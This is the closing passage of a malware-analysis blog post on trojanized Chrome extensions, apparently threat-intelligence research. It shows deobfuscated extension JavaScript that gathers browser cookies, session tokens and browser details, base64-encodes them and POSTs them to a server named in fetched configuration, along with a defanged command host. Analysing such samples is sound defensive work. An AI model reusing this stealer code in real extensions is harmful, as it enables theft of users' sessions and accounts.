						<span class="na">expirationDate</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">expirationDate</span> <span class="o">||</span> <span class="kc">null</span><span class="p">,</span>
						<span class="na">hostOnly</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">hostOnly</span><span class="p">,</span>
						<span class="na">httpOnly</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">httpOnly</span><span class="p">,</span>
						<span class="na">name</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
						<span class="na">path</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span>
						<span class="na">sameSite</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">sameSite</span> <span class="o">||</span> <span class="kc">null</span><span class="p">,</span>
						<span class="na">secure</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">secure</span><span class="p">,</span>
						<span class="na">session</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">session</span><span class="p">,</span>
						<span class="na">storeId</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">storeId</span> <span class="o">||</span> <span class="kc">null</span><span class="p">,</span>
						<span class="na">value</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">value</span>
					<span class="p">})),</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">n</span><span class="p">;</span>
				<span class="kd">let</span> <span class="nx">s</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
				<span class="k">try</span> <span class="p">{</span>
					<span class="nx">s</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">openapi_u</span><span class="p">));</span>
				<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
				<span class="p">}</span>
				<span class="kd">const</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">openapi_tk</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> || </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> || </span><span class="dl">'</span> <span class="o">+</span> <span class="nf">btoa</span><span class="p">(</span><span class="nb">navigator</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> || </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">uid</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> || </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">s</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> ||  || </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">k</span><span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">{</span>
						<span class="na">ms1</span><span class="p">:</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">i</span><span class="p">),</span>
						<span class="na">ms2</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenext_cx</span><span class="p">),</span>
						<span class="na">ms3</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">gpta</span><span class="p">)</span>
					<span class="p">},</span> <span class="nx">l</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
				<span class="nf">fetch</span><span class="p">(</span><span class="nx">l</span><span class="p">,</span> <span class="p">{</span>
					<span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
					<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
						<span class="na">Accept</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json, application/xml, text/plain, text/html, *.*</span><span class="dl">'</span><span class="p">,</span>
						<span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span>
					<span class="p">},</span>
					<span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span>
				<span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nx">t</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nf">a</span><span class="p">(</span><span class="nx">t</span><span class="p">)).</span><span class="k">catch</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="p">});</span>
			<span class="p">}</span>
		<span class="p">});</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="o">!</span><span class="mi">0</span><span class="p">;</span>
<span class="p">}),</span> <span class="k">async</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
	<span class="k">try</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://cyberhavenext[.]pro/ai-cyberhaven</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
			<span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
				<span class="na">Accept</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json, application/xml, text/plain, text/html, *.*</span><span class="dl">'</span><span class="p">,</span>
				<span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span>
			<span class="p">}</span>
		<span class="p">});</span>
		<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">t</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span>
			<span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="s2">`HTTP error! Status: </span><span class="p">${</span> <span class="nx">t</span><span class="p">.</span><span class="nx">status</span> <span class="p">}</span><span class="s2">`</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">t</span><span class="p">.</span><span class="nf">json</span><span class="p">();</span>
		<span class="k">await</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nf">set</span><span class="p">({</span> <span class="na">cyberhavenext_ext_manage</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">}),</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Data successfully stored!</span><span class="dl">'</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">An error occurred:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">t</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}();</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/chrome/" class="post-tag no-text-decoration" >chrome</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Trojanized%20Chrome%20Extensions%20-%20dmpdump&url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FTrojanizedChromeExtensions%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Trojanized%20Chrome%20Extensions%20-%20dmpdump&u=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FTrojanizedChromeExtensions%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FTrojanizedChromeExtensions%2F&text=Trojanized%20Chrome%20Extensions%20-%20dmpdump" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/Havoc/">Targeted Campaign Delivering Havoc</a><li class="text-truncate lh-lg"> <a href="/posts/NorthKorea_Backdoor_Stealer/">North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign</a><li class="text-truncate lh-lg"> <a href="/posts/TrojanizedChromeExtensions/">Trojanized Chrome Extensions</a><li class="text-truncate lh-lg"> <a href="/posts/KoiLoader/">KoiLoader/KoiStealer</a><li class="text-truncate lh-lg"> <a href="/posts/PUBLOAD_GrimResource/">PUBLOAD Likely Delivered to Thailand via GrimResource MSC</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a> <a class="post-tag btn btn-outline-primary" href="/tags/havoc/">havoc</a></div></section></div></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/NorthKorea_Backdoor_Stealer/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1736035200" data-df="ll" > Jan 5, 2025 </time><h4 class="pt-0 my-2">North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign</h4><div class="text-muted"><p>On December 28, 2024, @tayvano_ shared a great thread on X describing activity consistent with what is typically known as the “Contagious Interview” campaign conducted by North Korea-nexus threat a...</p></div></div></a></article><article class="col"> <a href="/posts/Havoc/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1736985600" data-df="ll" > Jan 16, 2025 </time><h4 class="pt-0 my-2">Targeted Campaign Delivering Havoc</h4><div class="text-muted"><p>On January 15, 2025, a file named DH-Report76.pdf.lnk was uploaded to VirusTotal. The LNK file was likely being delivered to victims from army-mil[.]zapto.org. Parsing the LNK file, we can see t...</p></div></div></a></article><article class="col"> <a href="/posts/PUBLOAD_GrimResource/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1735257600" data-df="ll" > Dec 27, 2024 </time><h4 class="pt-0 my-2">PUBLOAD Likely Delivered to Thailand via GrimResource MSC</h4><div class="text-muted"><p>On December 20, 2024, a Microsoft Management Console (MSC) file named “Invitation Letter.msc” was uploaded from Thailand to VirusTotal. File name: Invitation Letter.msc Hash: 5b18f8b379cb3294...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/PUBLOAD_GrimResource/" class="btn btn-outline-primary" aria-label="Older" ><p>PUBLOAD Likely Delivered to Thailand via GrimResource MSC</p></a> <a href="/posts/NorthKorea_Backdoor_Stealer/" class="btn btn-outline-primary" aria-label="Newer" ><p>North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/dmpdump">dmpdump</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a> <a class="post-tag btn btn-outline-primary" href="/tags/havoc/">havoc</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js"></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
